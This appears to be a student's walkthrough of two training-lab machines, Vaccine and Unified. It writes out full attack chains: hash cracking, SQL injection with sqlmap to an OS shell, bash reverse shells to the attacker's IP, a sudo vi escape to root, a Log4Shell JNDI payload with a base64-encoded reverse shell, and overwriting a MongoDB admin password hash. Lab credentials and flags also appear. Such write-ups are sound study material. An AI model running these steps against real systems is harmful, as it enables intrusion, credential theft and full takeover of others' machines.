
### **Starting Labs**

##### **Tier 2:**
###### Vaccine:

---website enum---

run nmap to find open ports

``nmap -sC -sV {ip}``

we find three ports that are open, the only relative one we can use right now is the ftp port, it states that it accepts ``anonymous`` as a login.

```	    
		    ftp {ip}
			anonymous/{no pass}
```
After logging in we see what we are working with,  we run ls and thats when we find ``backup.zip `` so we export it to our device using ``get``, and go back to our device.
```
			get backup.zip
			quit
```

We get the file from the ftp port we start working on it, after opening it we are prompted to enter a password which we don't know. So we convert the zip file to a format that john can interact. we also use the rockyou wordlist that is zipped up so we also need to unzip that.
```
		
		 zip2john backup.zip > hashes

		 gzip -d rockyou.txt.gz

		 john -wordlist=/usr/share/wordlists/rockyou.txt hashes
```

We cracked the password so now we can see it using the following john command:

```
		john --show hashes
```

Note password was 741852963, it will be in the following format bellow.
			
back.zip:{passwd}:: {...}			
			
```
		unzip backup.zip 
			enter password$:741852963
			
```

Entering the password successfully unzips the files for us. So now we read one of the two files that is outputted to us from unzipping the file.

```
cat index.php
```

There is a section that specifies that a password has to be equal to something when its md5 encrypted.

```
md5(passwd)==="2cb42f8734ea607eefed3b70af13bbd3"
```

To verify this we take the use a website called "https://hashes.com/en/tools/hash_identifier" to determine the encryption used. or we can use the ``hashid`` command verify this for us.

```
		 hashid 2cb42f8734ea607eefed3b70af13bbd3
```
We take the Cipher text and input it to a file we call hash to decrypt using ``hashcat``. We use -a to signify attack mode and the 0 after it stands for Straight. we use -m 0 to specify the hash we are decrypting, 0 stands for MD5 according to ``hashcat``'s manual.
```
		 echo '2cb42f8734ea607eefed3b70af13bbd3' > hash
		
		hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
```
			
after decrypting it qwerty789 is our password. 
it is in the following format:
{cipher:plaintxt(password)}
ex: 
2cb42f8734ea607eefed3b70af13bbd3:qwerty789

now that we have the website password we can login through webpage using these credentials.

		user: admin
		password: qwerty789
		
---Establishing foothold via Dashboard search ---
		Search bar only useful thing. so we use sql map with our cookies which we got using inspect element.
		
Get sql map and find vulnerabilities:

```
		sqlmap -u 'http://{ip}/dashboard.php?search=' --cookie="PHPSESSID=4t35be7jpviob87fi0crbl04o7"
```
		
We found that the search bar is vulnerable so we add a os shell to our cmd
		
```
		sqlmap -u 'http://10.129.95.174/dashboard.php?search=any' --cookie="PHPSESSID=4t35be7jpviob87fi0crbl04o7" --os-shell
```

now we need to find our own  ip for the shell we are trying to use so we open a new bash terminal.
		
in a new terminal, we type ``hostname -I`` to get our ip:

```
HOSTNAME -I
```

We then start listening on a specific port using netcat:
-l: listening
-v: verbose
-n: ip 
-p: port

```
Sudo nc -lvnp 1234
```

Go back to our old terminal, and type the following command to connect a bash terminal that we are spawning to our nc port that we setup, this will act as a bash shell for us. 

**the shell is unstable and will randomly disconnect sometimes, that is normal. If it happens just repeat the steps until we find another method to gain control**

```
bash -c "bash -i >& /dev/tcp/{your_IP}/{port} 0>&1"
```
After establishing the shell, we enter the following:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```

After looking through some directories we find user.txt file in '/var/lib/postgresql/'


			cat user.txt
		
		**>>ec9b13ca4d6229cd5cc1e09980965bf7**
		
that is our user flag which we will need to submit after we are done with the lab.

we continue digging and searching other directories, after going back a few directories we find the /var/www directory which has the website pages. 

we find a few files and after reading a few of them using ```cat ``` we find the following line in "dashboard.php"

```
try {
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres
password=P@s5w0rd!");
}
```

We can see that the postgres password is listed as ``
```P@s5w0rd!```. So we can use this to login via ssh which will give us a more stable shell as opposed to using os-shell and spawning our own bash terminal. 

we can now connect via SSH 

```
ssh postgres@{ip}
```

and then enter the password ``` P@s5w0rd!``` .

after running ```sudo -l``` to get the permissions we have this is the output:

```
postgres@vaccine:/$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

```

the following line at the end of the output 
```  
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
signifies we have sudo access to run  
```
/bin/vi 
```
on 
```
/etc/postgresql/11/main/pg_hba.conf
```

so to check the file we run the command
```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

after opening the vi file we can type in the following command to set the shell and then run it:
```
:Set shell=/bin/sh

:shell
```
since we ran the shell with sudo privileges we now have root access, we can verify this by typing ```
```
whoami
```
we should get "root" in the response.

![[VqKjp5f.png]]

after verifying we are root, we can look at the directory we are in and try to navigate the the root folder we saw earlier
```
cd root

ls 

cat root.txt
```
after reading the root file we get the root flag:
```
dd6e058e814260bc70e9bbdef2715849
```


Now we have the user and root flag:
User: ec9b13ca4d6229cd5cc1e09980965bf7
Root: dd6e058e814260bc70e9bbdef2715849

-------

###### Unified:

---ip enum---

```
nmap -sC -sV -v {ip address}
```

We notice that one of the ports is hosting something called "unify", so we check that out. after some testing we dont find anything so we look up the version of unify for known exploits.

We find a cve (CVE-2021-44228) that gives us some context into how to exploit this. We  open our burpsuite and paste the ip of the website into our burp port trigger's url, and send in a fake login attempt with any parameters. 

From there we modify the "remember" section with the following parameters.

```
"username":"test",
"password":"test",
"${jndi:ldap://{ip}:{port}/test}",
"strict":true
```

That's when we notice we get back some info

```
{
	meta:{
	"rc":"error",
	"msg":"api.err.invalid payload"
	}
}
```

This gives us a clue that there is something worth investigating. 

So we can use tcpdump or wireshark to proceed. 

```
sudo tcpdump -i tun0 port {port}
```

we get a paragraph of data that has a bunch of captured traffic, the main part that interests us is the ip towards the end.

```
10.129.70.148.59360
```

After some more digging I find an interesting page talking about the vulnerability in depth
'https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi'

We are just gonna install some stuff we are going to need:

```
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package

mvn package
```

We are then gonna follow the steps in the document, the goal is to create a reverse shell.
to do this we are first going to encode a string in base64 and then we are going to start using RogueJndi to exploit the website:
```
echo 'bash -c bash -i >&/dev/tcp/{tun0 ip}/{port} 0>&1' | base64
```

After running this command we should get a base64 string. We are then gonna use that encoded string to in our RogueJndi command. 

```
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,"{Base64 String}"}|{base64,-d}|{bash,-i}" --hostname "{our tun0 ip}"
```

if done correctly you should see that it spawned an http and a ldap server.
HTTP server on port 8000 and LDAP on 1389.

```
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
```


From here we can move back to our burpsuite repeater and modify the remember field again to get access to our reverse shell.

```
"${jndi:ldap://10.10.14.103:1389/o=tomcat}"
```

After modifying it you can start a nc to listen to it, and when we connect we use  a script to make it interactive and easier to use.

```
nc -nlvp {ip}:{port}

script /dev/null -c bash
```

Hit send and you should get access to the reverse shell, to verify you can type ``whoami`` and you should get a response back saying ``unify``.

Before we try and privilege escalation or upgrading the shell any further, it might serve in our interest to search through some directories and for any interesting files.

we navigate to the root folder via cd, and run a command to search for user and root flags:

```
cd ../../..

find / -iname "user.txt" 2>/dev/null

sudo find / -iname "root.txt" 2>/dev/null

```

After running the commands we end up only finding the User Flag:

```
6ced1a6a89e666c0620cdb10262ba127
```

We can now upgrade our shell by using python to import a library called pty, which will enable us to spawn bash.
--- privilege escalation --- 
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Met with a error, we realize python is not installed on this device, so we try to exploit via mongo since unifi uses mongo.

we use this command to figure out our mongo port.

```
ps aux | grep mongo
```

Our next step is to connect to the mongo database to do that we use:
here we enter the port we got from the previous command and the name of unifi's default database name (ace), which we got with some google searches. 

```
mongo --port {port} ace
```

We then lookup how to retrieve data from mongo and realize that the method is called `find()`
so we run that method on admin to get user data.

```
db.admin.find()
```

Upon looking at the data we get lost with whats shown so to pretty it up we convert it to a json format to make it easier for us to read.

```
db.admin.find().forEach(printjson);
```

There now its easier for us to read. We see that the first entry is an admin's data, we copy the password and try to crack it, first step is to try to identify the encryption, then use john to crack it.

```
cat > text.txt

hashid text.txt

john --wordlist {rockyou path} text.txt
```

we can probably add extra arguments to try and specify the hash type, but this give us some time to explore some other avenues or take a quick break.

lets try to make our own hash

```
mkpasswd -m sha-512 testpassword
```

we get the following output:

```
$6$fruA9k.oNUkOWRtE$ZUGCpWyUciPHFq.jv5JWyORx7/Kkr49.YR0qgG3E6ifqL9seyBb3HT07TYnrlyXqtivbZLx8SqaJslCIb3/5I/
```

We now make a new user with the password hash we just generated to be able to connect to it via the website in a sec.

```
db.admin.insert({
  "email": "debuguser1001@localhost.local",
  "last_site_name": "default",
  "name": "debuguser1001",
  "time_created": NumberLong(100019800),
  "x_shadow": "$6$fruA9k.oNUkOWRtE$ZUGCpWyUciPHFq.jv5JWyORx7/Kkr49.YR0qgG3E6ifqL9seyBb3HT07TYnrlyXqtivbZLx8SqaJslCIb3/5I/"
});
```

To ensure this was added we can run this command again but modify it to search for names that match our newly made user. Now our user should be listed if done correctly.

```
db.admin.find({ "name": "debuguser1001" }).forEach(printjson);
```

Now we can login to the website with those credentials in my case its debuguser1001 and testpassword. After some messing around there is something obviously wrong with our account or the website where we cannot access the majority of the features or the settings on the website. so we will try another approach

Instead of making a new user what if we just updated the password to an existing one ? well to do this i need to use the update method:

```
db.admin.update({"_id":
ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$fruA9k.oNUkOWRtE$ZUGCpWyUciPHFq.jv5JWyORx7/Kkr49.YR0qgG3E6ifqL9seyBb3HT07TYnrlyXqtivbZLx8SqaJslCIb3/5I/"}})'
```

Now we can attempt to login again. After logging in the UI looks functional therefore we can assume we did not create the user with all the information needed, we might have missed a UI option since it seems there is more than 1 UI you can choose so I am speculating things broke down when we did not supply that. 

After some messing around, I found myself in the settings looking at the site tab. after scrolling down I found a ssh section and remembered that we originally scanned an ssh port in our nmap scan so lets try to connect via ssh and see what we can get.

```
ssh root@{ip}
```

From here we agree to connecting and enter the password we got from the web page. There we go!! now we are logged in

to see what we are working with we run ``ls`` and see that we only have a root.txt file so lets read that using ``cat root.txt``

and there we go we got our root flag ```

```
e50bc93c75b634e4b272d2f771c33681
```

Therefore our flags:
**user: 6ced1a6a89e666c0620cdb10262ba127
root: e50bc93c75b634e4b272d2f771c33681
**
###### Included: